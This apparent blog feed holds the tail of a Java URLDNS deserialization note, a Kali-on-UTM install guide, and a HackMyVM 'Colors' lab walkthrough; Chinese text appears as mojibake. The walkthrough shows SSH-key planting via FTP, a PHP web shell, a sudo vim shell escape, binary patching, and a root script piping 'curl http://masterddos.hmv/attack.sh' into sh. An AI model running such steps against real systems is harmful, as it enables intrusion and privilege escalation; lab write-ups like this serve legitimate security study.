<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¼šåˆ¤æ–­hashCodeçš„å€¼ï¼Œå¦‚æœä¸æ˜¯-1ä¼šç›´æ¥è¿”å›hashCodeçš„å€¼ï¼Œè€Œä¸ä¼šè¿›å…¥æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„handler.hashCode</p>
<p>åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šè§¦å‘æ˜¯å› ä¸ºURLé‡Œé¢åˆå§‹åŒ–å®šä¹‰hashCodeæ˜¯-1ï¼Œæ‰€ä»¥ä¸€å¼€å§‹ä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œè€Œä¸”åé¢èµ‹å€¼æ›´æ”¹äº†ä¹‹åå°±è¿›ä¸å»äº†ã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120223737.png" ></p>
<p>æ‰€ä»¥æŒ‰ä¹‹å‰ä»€ä¹ˆçš„ä»£ç æ‰§è¡Œï¼Œåºåˆ—åŒ–çš„æ—¶å€™å°±å‡ºç°äº†dnsè§£æï¼Œåé¢ååºåˆ—åŒ–çš„æ—¶å€™å´æ²¡å‘ç”Ÿï¼Œè¿™æ˜æ˜¾ä¸æ˜¯æˆ‘ä»¬ç†æƒ³ä¸­çš„æ•ˆæœã€‚</p>
<p>é‚£æˆ‘ä»¬ç°åœ¨è¦åšçš„æ˜¯ä¿è¯æ•´ä¸ªå®éªŒè¿‡ç¨‹ï¼Œåªæœ‰åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ‰ä¼šè§¦å‘handler.hashCodeï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦è§£å†³ä¸¤ä¸ªé—®é¢˜ï¼šç¬¬ä¸€æ˜¯putä¹‹å‰hashmapçš„hashCodeä¸æ˜¯-1ï¼Œputä¹‹åå†æŠŠå®ƒå˜å›-1ã€‚è¿™é‡Œæˆ‘ä»¬å°±ç”¨åˆ°<strong>åå°„</strong></p>
<blockquote>
<p>Java åå°„æœºåˆ¶å…è®¸åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°è·å–ç±»çš„ä¿¡æ¯ï¼ˆå¦‚å­—æ®µã€æ–¹æ³•ã€æ„é€ å‡½æ•°ç­‰ï¼‰ï¼Œå¹¶æ“ä½œç±»çš„å¯¹è±¡ï¼Œä»è€Œå®ç°æ›´åŠ çµæ´»å’Œé€šç”¨çš„ä»£ç ã€‚</p>
</blockquote>
<p>åå°„çš„æµç¨‹æ˜¯å…ˆè·å–ç±»ï¼Œç„¶åå®ä¾‹åŒ–å¯¹è±¡ï¼Œè·å–ç±»é‡Œé¢çš„å±æ€§ï¼Œåšä¸€äº›ä¿®æ”¹å¯¹è±¡å±æ€§æˆ–è€…è°ƒç”¨æ–¹æ³•ç­‰æ“ä½œã€‚</p>
<p>çœ‹å®ç°ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://diru.callback.red&quot;</span>);</span><br><span class="line">HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> u.getClass(); <span class="comment">// è·å–uçš„ç±» è¿™é‡Œæ˜¯ class.java.net.URL</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">HashCodeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>); <span class="comment">// geiDeclaredFieldè·å–é‡Œé¢çš„å˜é‡hashCode</span></span><br><span class="line">HashCodeField.setAccessible(<span class="literal">true</span>); <span class="comment">// è®¾ç½®è®¿é—®æƒé™ä¸ºçœ‹ä¿®æ”¹</span></span><br><span class="line"><span class="comment">// æ¥ä¸‹æ¥å°±å¯ä»¥å¯¹å˜é‡çš„æ“ä½œï¼Œä¿®æ”¹æˆæˆ‘ä»¬æƒ³è¦çš„å€¼</span></span><br><span class="line">HashCodeField.set(u,<span class="number">1234</span>);  <span class="comment">// éšä¾¿ä¸€ä¸ªä¸æ˜¯-1çš„å€¼</span></span><br><span class="line">hashmap.put(u,<span class="number">1</span>);<span class="comment">// HashMapçš„putç»™é”®å€¼å¯¹èµ‹å€¼</span></span><br><span class="line">HashCodeField.set(u,-<span class="number">1</span>);  <span class="comment">// å†ä¿®æ”¹å›-1ï¼Œä¿è¯ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¯ä»¥è¢«æˆåŠŸè°ƒç”¨</span></span><br><span class="line">serialize(hashmap); <span class="comment">// è¿›å…¥ååºåˆ—åŒ–</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨åå°„è¿›è¡Œä¸€ç³»åˆ—æ“ä½œï¼Œæœ€åä¿è¯åªæœ‰åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ‰èƒ½çœ‹åˆ°DNSè§£æï¼Œè‡³æ­¤ï¼Œé“¾å­å°±åˆ†æå®Œæˆäº†ã€‚</p>
<h4 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h4><p>æ„Ÿè°¢å‰é¢å„ä½å¸ˆå‚…å†™çš„è§£é‡Šæ•™å­¦ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€åˆ—å‡ºæ¥äº†ã€‚æœ¬äººè¿˜åœ¨å­¦ä¹ ï¼ŒåŸºç¡€ä¸æ˜¯éå¸¸æ‰å®ï¼Œå¦‚æœè¿™ç¯‡æ–‡ç« å“ªé‡Œå†™çš„ä¸å¥½ï¼Œéå¸¸æ¬¢è¿æ‰¾æˆ‘æŒ‡æ­£äº¤æµï¼Œæ„Ÿè°¢ğŸ™</p>
]]></content>
      <tags>
        <tag>å­¦ä¹ ç¬”è®°</tag>
        <tag>Java</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>Macbook Mç³»ç»ŸèŠ¯ç‰‡ç”¨UTMå®‰è£…æœ€æ–°kali linux</title>
    <url>/2024/09/11/Macbook-M%E7%B3%BB%E7%BB%9F%E8%8A%AF%E7%89%87%E7%94%A8UTM%E5%AE%89%E8%A3%85%E6%9C%80%E6%96%B0kali-linux/</url>
    <content><![CDATA[<h4 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h4><p>è¿™ä¸¤å¤©å¶ç„¶ä¸€ä¸ªå¥‘æœºæƒ³è£…ä¸ªæœ€æ–°çš„kaliï¼Œæ‰¾åˆ°å®˜ç½‘çš„æ•™ç¨‹è£…èµ·æ¥å¾ˆè½»æ¾ã€‚å›æƒ³åˆšå¼€å§‹æ¥è§¦è£…è™šæ‹Ÿæœºçš„æ—¶å€™èµ·ç æŠ˜è…¾ä¸€æ˜ŸæœŸï¼Œæ‰€ä»¥å°±åƒå†™ä¸ªåšå®¢è®°å½•ä¸€ä¸‹ï¼Œå¦‚æœæœ‰äººçœ‹åˆ°æœ‰è¢«å¸®åŠ©åˆ°ï¼Œé‚£å°±æ›´å¥½äº†ï¼Œå¸Œæœ›ä½ èƒ½å°‘è¸©ç‚¹å‘å§ã€‚</p>
<p><a class="link"   href="https://www.kali.org/docs/virtualization/install-utm-guest-vm/" >å®˜æ–¹å‚è€ƒæ–‡æ¡£<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h4><p>UTMï¼šæ‰¾åˆ°<a class="link"   href="https://mac.getutm.app/" >å®˜ç½‘<i class="fas fa-external-link-alt"></i></a>ä¸‹è½½å®‰è£…å³å¯</p>
<p>Kalié•œåƒï¼š<a class="link"   href="https://www.kali.org/get-kali/#kali-installer-images" >é•œåƒåœ°å€<i class="fas fa-external-link-alt"></i></a></p>
<p>è®°å¾—é€‰æ‹©è¿™ä¸ªApple slliconçš„ï¼Œä¸­é—´recommendé‚£ä¸ªå°±è¡Œ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911113834.png" ></p>
<h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><p>åœ¨UTMæ‰¾åˆ°â€œæ–°å»ºâ€æ·»åŠ ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œ<strong>é€‰æ‹©â€œè™šæ‹ŸåŒ–â€-&gt;â€œå…¶ä»–â€</strong></p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911114826.png"   style="zoom:50%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115935.png"   style="zoom:50%;" >

<p>åœ¨ç¬¬ä¸‰ä¸ªé¡µé¢ç‚¹å‡»â€œæµè§ˆâ€ï¼ŒæŠŠæˆ‘ä»¬ä¸‹è½½çš„kalié•œåƒæŒ‚ä¸Šå»</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115109.png"   style="zoom:50%;" >

<p>æ¥ä¸‹æ¥å°±ä¸€ç›´ç‚¹å‡»â€œç»§ç»­â€ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€è¦è°ƒæ•´å†…å­˜å’ŒCPUæ ¸æ•°é‡</p>
<p>åˆ°è™šæ‹Ÿæœºè®¾ç½®å®Œæˆï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç¼–è¾‘ä¸€ä¸‹ä¸€äº›é…ç½®</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115415.png" ></p>
<p>æˆ‘ä»¬éœ€è¦åœ¨è¿™é‡Œæ·»åŠ ä¸€ä¸ªserial</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115450.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115651.png" ></p>
<p>ç„¶å<strong>ä¿å­˜</strong>å³å¯ï¼Œå¯åŠ¨è™šæ‹Ÿæœºè¿›è¡Œä¸€äº›é…ç½®</p>
<h4 id="Kaliåˆå§‹é…ç½®"><a href="#Kaliåˆå§‹é…ç½®" class="headerlink" title="Kaliåˆå§‹é…ç½®"></a>Kaliåˆå§‹é…ç½®</h4><p>è™šæ‹Ÿæœºå¯åŠ¨åå°±èƒ½çœ‹åˆ°é€‰æ‹©ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©äº†å›¾å½¢åŒ–å®‰è£…</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120052.png" ></p>
<p>è¯­è¨€é€‰English</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120149.png" ></p>
<p>æ—¶åŒºå»ºè®®é€‰æ‹©Hong Kong</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120217.png" ></p>
<p>é”®ç›˜ä¹Ÿæ˜¯é€‰ç¾å¼çš„</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120243.png" ></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯ä¸ªæ€§åŒ–åˆ¶å®šä½ çš„ç”¨æˆ·åå’Œæœºå­çš„åå­—äº†ï¼Œè‡ªå·±é€‰å§</p>
<p>å¡«å®Œä¸€äº›äº†ä¸ªæ€§åŒ–åå­—ï¼Œåˆ°äº†è¿™é‡Œæˆ‘é€‰æ‹©ç¬¬ä¸€ä¸ª</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120656.png" ></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯ä¸€è·¯é€‰æ‹©yes&#x2F;continueå°±è¡Œï¼Œç­‰å¾…è™šæ‹Ÿæœºè‡ªå·±åŠ è½½</p>
<p>ç»è¿‡æ¼«é•¿çš„ç­‰å¾…ï¼Œåˆ°çœ‹åˆ°è¿™ä¸ªé¡µé¢å°±å¯ä»¥äº†ï¼Œé€‰æ‹©continueåˆ°å‡ºç°é»‘å±çš„æ—¶å€™æŠŠè™šæ‹Ÿæœºå…³é—­</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911122515.png" ></p>
<p>ç„¶åå›åˆ°UTMæ‰“å¼€è™šæ‹Ÿæœºç¼–è¾‘ï¼ŒæŠŠä¹‹å‰æŒ‚è½½çš„isoå’Œserialç»™åˆ äº†ï¼Œå†åˆ°è¿™ä¸ªâ€œæ˜¾ç¤ºâ€</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911122841.png" ></p>
<p>æŠŠé€‰é¡¹æ”¹æˆâ€™virtio-gpu-pciâ€™ï¼Œå†ä¿å­˜å¯åŠ¨è™šæ‹Ÿæœºï¼Œæ­£å¸¸è¾“å…¥ä½ ä¹‹å‰è®¾ç½®çš„è´¦å·å¯†ç ï¼Œæ­£å¸¸å¼€æœºï¼Œå¤§åŠŸå‘Šæˆï¼</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911123136.png" ></p>
<h4 id="å…³äºå¤åˆ¶ç²˜è´´çš„è¡¥å……"><a href="#å…³äºå¤åˆ¶ç²˜è´´çš„è¡¥å……" class="headerlink" title="å…³äºå¤åˆ¶ç²˜è´´çš„è¡¥å……"></a>å…³äºå¤åˆ¶ç²˜è´´çš„è¡¥å……</h4><p>ç”¨äº†å‡ å¤©ä¸‹æ¥å‘ç°ä¸èƒ½å’Œç‰©ç†ä¸»æœºå…±äº«å‰ªåˆ‡æ¿ï¼Œéå¸¸éš¾å—ï¼Œç»è¿‡ä¸€ç•ªæ‘¸ç´¢ï¼Œæ‰¾åˆ°äº†å¯æƒœçš„è§£å†³æ–¹æ³•ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt-get install qemu-guest-agent</span><br><span class="line">sudo apt install spice-vdagent</span><br></pre></td></tr></table></figure>

<p>å®‰è£…å®Œè¿™äº›å†é‡å¯è™šæ‹Ÿæœºå³å¯ï¼</p>
]]></content>
      <tags>
        <tag>éšç¬”</tag>
        <tag>æ•™ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm Colorså¤ç›˜</title>
    <url>/2024/03/20/hackmyvm-Colors%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h4><p>è¿™ä¸ªé¶åœºæ¶‰åŠçš„çŸ¥è¯†ç‚¹æ¯”è¾ƒå¤šï¼Œæ€è·¯æ˜¯å¤§éƒ¨åˆ†å­¦ä¹ å…¶ä»–å¸ˆå‚…çš„wpçš„ï¼Œå†™å¤ç›˜æ˜¯æƒ³è®°å½•æ€è·¯é¡ºä¾¿å›é¡¾å­¦å¥½æ¯ä¸ªçŸ¥è¯†ç‚¹ã€‚</p>
<h4 id="å¯åŠ¨å‰å‡†å¤‡"><a href="#å¯åŠ¨å‰å‡†å¤‡" class="headerlink" title="å¯åŠ¨å‰å‡†å¤‡"></a>å¯åŠ¨å‰å‡†å¤‡</h4><p>ç”±äº<strong>ç½‘å¡é…ç½®ä¸åŒ</strong>ï¼Œæˆ‘æ¯æ¬¡éƒ½éœ€è¦å¼€é¶æœºåˆšå¼€å¯çš„æ—¶å€™shift+eè¿›å…¥grubç¼–è¾‘ï¼Œç»™ä¸€ä¸ªrootçš„&#x2F;bin&#x2F;bashå¯åŠ¨ç¼–è¾‘ä¸€ä¸‹&#x2F;etc&#x2F;netwrok&#x2F;interfacesé‡Œé¢çš„ç½‘å¡é…ç½®ï¼Œè¿™æ˜¯å‰ç½®èƒŒæ™¯ã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320144812.png" ></p>
<h4 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h4><p>åœ°å€ï¼š<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Colors" >https://hackmyvm.eu/machines/machine.php?vm=Colors<i class="fas fa-external-link-alt"></i></a></p>
<p>éš¾åº¦ï¼šmedium</p>
<p>ipï¼š192.168.64.92</p>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><p>nmapæ‰«åˆ°21ã€22ã€80ç«¯å£ï¼Œå¹¶ä¸”22ç«¯å£è¢«è¿‡æ»¤äº†ï¼ˆæ³¨æ„è¿™é‡Œè¦ç”¨rootæ‰«å¦‚æœç”¨æ™®é€šç”¨æˆ·æ‰«æ‰«ä¸åˆ°22ç«¯å£ä¿¡æ¯ï¼‰</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154203.png" ></p>
<p>å…ˆè®¿é—®80ç«¯å£</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154338.png" ></p>
<p>åªæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œæ‰«ç›®å½•ä¸€æ— æ‰€è·ï¼Œä¹Ÿå¯¹å›¾ç‰‡åˆ†æä¸å‡ºä»€ä¹ˆå†…å®¹</p>
<p>çœ‹çœ‹21å·ç«¯å£</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154455.png" ></p>
<p>çœ‹èµ·æ¥å¯ä»¥ç”¨anonymousç™»é™†ï¼Œç™»é™†ä¸€ä¸‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154607.png" ></p>
<p>æŠŠsecret.jpgä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨stegseekåˆ†æä¸€æ³¢</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155012.png" ></p>
<p>æå‡ºæ¥ä¸€æ®µå­—ç¬¦ï¼Œåœ¨cyberchefåˆ†æï¼Œæ˜¯base85</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155123.png" ></p>
<p>å¾—åˆ°ä¸€ä¸ªpinkçš„è´¦å·å¯†ç ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘çš„æ€è·¯æ˜¯å»ç™»é™†22ç«¯å£ï¼Œä½†æ˜¯å®ƒçš„ç«¯å£filtedï¼Œåæ¥å»çœ‹äº†wpæ‰çŸ¥é“è¿™é‡Œæœ‰ä¸€ä¸ªç«¯å£æ•²é—¨ï¼Œftpé‚£é‡Œå°±ç»™äº†æç¤ºï¼ˆå¥½ç¥å¥‡çš„ç‚¹å­ï¼‰</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.54.39.png" ></p>
<p>1127ï¼Œ1039ï¼Œ1081åˆ†åˆ«å¯¹åº”firstï¼Œsecondï¼Œthirdæ•²é—¨é¡ºåºï¼ŒæŒ‰é¡ºåºæ•²é—¨ç«¯å£æ‰ä¼šæ‰“å¼€ï¼Œç±»ä¼¼æƒ…å†µä¹‹å‰åšvulnçš„DCç³»åˆ—çš„é¶æœºä¹Ÿé‡åˆ°è¿‡ã€‚</p>
<h5 id="ä¸€ä¸ªé—®é¢˜"><a href="#ä¸€ä¸ªé—®é¢˜" class="headerlink" title="ä¸€ä¸ªé—®é¢˜"></a>ä¸€ä¸ªé—®é¢˜</h5><p>çŸ¥é“äº†è¿™ä¸ªæ€è·¯ï¼Œæˆ‘æŒ‰ç…§å¸¸è§„æ€è·¯knockä¸‰ä¸ªç«¯å£ï¼Œç„¶è€Œ22ç«¯å£æ²¡æœ‰æŒ‰ç…§é¢„æœŸçš„æ‰“å¼€ï¼Œæˆ‘è¯•äº†å¾ˆå¤šæ¬¡ï¼Œè¿˜æ˜¯å¤±è´¥ï¼Œä¹Ÿä¸çŸ¥é“åŸå› ã€‚ç¬¬äºŒå¤©ä¸ºäº†æƒ³å®è·µåé¢çš„å…³å¡ï¼Œæƒ³ç€å¹²è„†å…³äº†é˜²ç«å¢™ï¼Œæ‰€ä»¥å€ŸåŠ©grubç™»é™†rootï¼ŒæŒ‰ç…§ç½‘ä¸Šç»™çš„å‘½ä»¤æ€»æ˜¯å¤±è´¥ï¼Œæ›´å¤´ç–¼äº†ã€‚ç„¶åå°±æƒ³çœ‹çœ‹knockçš„é…ç½®æ–‡ä»¶ï¼Œæ‰¾åˆ°æ—¥å¿—æ–‡ä»¶ï¼Œä¸€çœ‹åˆ°enp0s3æˆ‘å°±æƒ³åˆ°è¦æ”¹æˆenp01ï¼Œæ€è·¯å°±æ¥äº†ã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2014.56.31.png" ></p>
<p>äºæ˜¯ç»è¿‡ä¸€ç•ªæœç´¢ï¼Œæ‰¾åˆ°&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;knockd.serviceï¼ŒæŠŠé‡Œé¢çš„enp0s3æ”¹æˆenp0s1ï¼Œå†å¯åŠ¨é¶æœº</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.24.31.png" ></p>
<p>è¿™æ¬¡å°±å¯ä»¥äº†</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320160752.png" ></p>
<p>è™½ç„¶è¿™ä¸ªé—®é¢˜æ˜¯é’ˆå¯¹è‡ªå·±çš„ç”µè„‘äº§ç”Ÿçš„ï¼Œåˆ«äººçš„ç”µè„‘å¯èƒ½ä¸ä¼šå‡ºç°è¿™æ ·çš„æƒ…å†µï¼Œä½†æ˜¯æ•´ä¸ªè¿‡ç¨‹æ˜¯è‡ªå·±ä¸€ç‚¹ä¸€ç‚¹æ‘¸ç´¢åˆ°ï¼Œæœ€åæˆåŠŸè§£å†³çš„æ—¶å€™çœŸçš„å¾ˆå¼€å¿ƒï¼Œæ‰€ä»¥å€¼å¾—è®°å½•ä¸€ä¸‹ã€‚</p>
<h4 id="è·å¾—shell"><a href="#è·å¾—shell" class="headerlink" title="è·å¾—shell"></a>è·å¾—shell</h4><p>okè§£å†³äº†sshçš„é—®é¢˜ï¼Œæƒ³ç”¨ä¹‹å‰æ‹¿åˆ°çš„pinkè´¦å·å¯†ç ç™»é™†ï¼Œè¿˜æ˜¯å¤±è´¥</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161201.png" ></p>
<p>æŠ¥é”™è¯´publickeyï¼Œè¯´æ˜éœ€è¦å¯†é’¥æ–‡ä»¶ç™»é™†ã€‚æåŠå¤©pinkçš„è´¦å·å¯†ç å¯ä»¥ç”¨ftpç™»é™†ï¼Œå¯¹ftpçš„æ•æ„Ÿåº¦è¿˜ä¸å¤Ÿï¼Œä¸€ç›´æ²¡æƒ³åˆ°ï¼Œç™»é™†å</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161544.png" ></p>
<p>pinkç›®å½•ä¸‹æœ‰.sshç›®å½•ï¼Œ<strong>æ€è·¯æ˜¯åœ¨é‡Œé¢ä¸Šä¼ è‡ªå·±kaliçš„id_rsa.pubï¼ˆå‘½åä¸ºauthorized_keys)ï¼Œç„¶åç”¨é‚£ä¸ªæ–‡ä»¶ä¸ºå‡­è¯è‡ªå·±kaliç™»é™†ssh</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161803.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161819.png" ></p>
<p>ç™»é™†æˆåŠŸ</p>
<h4 id="ææƒè¿‡ç¨‹"><a href="#ææƒè¿‡ç¨‹" class="headerlink" title="ææƒè¿‡ç¨‹"></a>ææƒè¿‡ç¨‹</h4><p>æ‹¿åˆ°pinkçš„shellåæ²¡èƒ½å‘ç°ä»€ä¹ˆï¼Œæ¥ä¸‹æ¥çš„æ€è·¯æ˜¯å»åˆ°&#x2F;var&#x2F;www&#x2F;htmlä¸Šä¼ ä¸€ä¸ªa.phpï¼Œå†åœ¨ç½‘é¡µç«¯è®¿é—®a.phpï¼Œå°±æ‹¿åˆ°www-dataçš„shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320212842.png" ></p>
<p>Sudo -læŸ¥çœ‹åˆ°greenæœ‰vimå¯ä»¥åˆ©ç”¨ææƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u green /usr/bin/vim</span><br></pre></td></tr></table></figure>

<p>å†è¾“å…¥â€™:!&#x2F;bin&#x2F;shâ€™ï¼ŒæˆåŠŸæ‹¿åˆ°greençš„shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320213122.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">green@color:/var/www/html$ <span class="built_in">cd</span> /home/green</span><br><span class="line"><span class="built_in">cd</span> /home/green</span><br><span class="line">green@color:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">note.txt  test_4_green</span><br><span class="line">green@color:~$ <span class="built_in">cat</span> no</span><br><span class="line"><span class="built_in">cat</span> note.txt</span><br><span class="line">You<span class="string">&#x27;ve been working very well lately Green, so I&#x27;</span>m going to give you one last <span class="built_in">test</span>. If you pass it I<span class="string">&#x27;ll give you the password for purple.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-root</span></span><br><span class="line"><span class="string">green@color:~$ ./test_4_green</span></span><br><span class="line"><span class="string">./test_4_green</span></span><br><span class="line"><span class="string">Guess the number im thinking: 1</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Nope, sorry</span></span><br><span class="line"><span class="string">green@color:~$</span></span><br></pre></td></tr></table></figure>

<p>åˆ°greenåˆ°å®¶ç›®å½•ä¸‹å¤§è‡´å¯ä»¥åˆ©ç”¨çš„å°±æ˜¯test_4_greenï¼Œä¸‹è½½åˆ°æœ¬åœ°ï¼Œidaæ‰“å¼€æŸ¥çœ‹ä¸€ä¸‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.48.22.png" ></p>
<p>æ³¨æ„åˆ°æœ‰ä¸ªjnzæ¯”è¾ƒ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.50.38.png" ></p>
<p>å¤§è‡´å°±æ˜¯æ¯”è¾ƒv8å’Œv7ï¼Œè¿™é‡Œç”¨idaä¿®æ”¹ä¸€ä¸‹jnzä¸ºjz</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320215526.png" ></p>
<p>ä¿å­˜åå†æ‰§è¡Œï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªæ•°å­—ä¹Ÿä¼šçˆ†å‡ºå¯†ç </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.57.24.png" ></p>
<p>æ¥ç€å°±ç™»é™†purpleè´¦æˆ·</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">purple@color:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> purple on color:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User purple may run the following commands on color:</span><br><span class="line">    (root) NOPASSWD: /attack_dir/ddos.sh</span><br><span class="line">purple@color:~$ <span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p</span><br></pre></td></tr></table></figure>

<p>sudo -lå‘ç°æœ‰ä¸ªè„šæœ¬å¯ä»¥ç”¨ï¼Œå°±æ˜¯è¦ä¸‹è½½masterddos.hmvä¸‹çš„attack.shç„¶åäº¤ç»™&#x2F;usr&#x2F;bin&#x2F;sh æ‰§è¡Œ</p>
